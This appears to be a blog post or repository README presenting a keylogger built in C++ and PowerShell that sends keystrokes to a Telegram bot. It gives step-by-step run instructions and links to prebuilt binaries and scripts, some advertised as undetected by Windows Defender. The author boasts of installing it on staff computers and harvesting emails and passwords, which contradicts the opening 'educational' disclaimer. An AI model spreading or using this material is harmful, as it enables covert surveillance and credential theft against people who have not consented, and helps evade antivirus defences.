**Disclaimer: </br>
It is important to note that creating and using a keylogger without the explicit consent of the user is illegal and unethical. The purpose of this blog post is to provide educational content on how keyloggers can be created, and the security implications involved. The techniques and methods described in this post should not be used to engage in any illegal or unethical activities.**

## ðŸ”§ Tools Used
To build this keylogger, I used the following tools and technologies:

- C++
- PowerShell
- Telegram Bot API

## ðŸš€ Getting Started
To start, I created a new C++ console application and included the necessary header files for keyboard input monitoring. I then wrote code to capture keystrokes and store them in a text file. However, this alone was not enough, as the keylogger needed to be able to send the keystrokes to a receiver.

To achieve this, I used PowerShell to read the contents of the text file and send them to a Telegram bot. I created a new bot using the Telegram Bot API and obtained an API token, which I used to authenticate requests to the bot. I then wrote a PowerShell script to send a POST request to the Telegram bot API with the contents of the text file.

## ðŸ’» The STEPS

My Scripts
To run an keylogger ,follow these steps:

Clone or Download the Programs given below and modify the source code depending on your needs.

Execute the keylog.exe file, which will run the undetected keylogger.

To integrate the keylogger with C++ (undetected by Windows Defender), execute the C++ Integrate file.(optional)

To use only PowerShell (detected by Windows Defender), execute the Keylogger Using Only PowerShell file.

If keylog.exe does not work, run the dll-installer.ps1 if keylog.exe doesn't work . Run it as admin.

keylog.exe --> <a href="https://github.com/Whitecat18/Ps-script-for-Hackers-and-Pentesters/raw/main/scripts/keylog.exe" > Click Here </a>

C++ Integrate ( Undeteted By Windows Defender) --> <a href="https://raw.githubusercontent.com/Whitecat18/Ps-script-for-Hackers-and-Pentesters/main/scripts/keylogger/c%2B%2B%20integrate%20powershell.ps1" > click here </a><br>


Keylogger Using Only Powershell ( Detected By Defender ! )--> <a href="https://github.com/Whitecat18/Ps-script-for-Hackers-and-Pentesters/blob/main/scripts/script1.ps1" > Click Here </a> <br>
 
 IF keylog.exe doesnt work . RUN THIS SCRIPT AS ADMIN --> <a href="https://github.com/Whitecat18/Ps-script-for-Hackers-and-Pentesters/blob/main/scripts/keylogger/dll-installer.ps1" > Click Here </a> <br>
 
 *NOTE : Before Executing the scripts . Modify The source code depend upon your needs .*
 
 ## SCREENSHOTS :
 
 I EXECUTED MY KEYLOGGER ON STAFFS COMPUTERS . NOW ONCE IF I EXECUTED THE SCRIPT ONCE. IT WILL SEND THE STOKES FOR EVERY 5 SECONDS .
 I GOT MORE INTERESTING THINGS THAN DAMM EMAIL AND PASSWD ;)

 FOR TESTING PURPOSE INSTALL g++ and Execute it 
 
 WORKING ON UNDETECTABLE PAYLOAD USING POWERSHELL . Damn SOn..
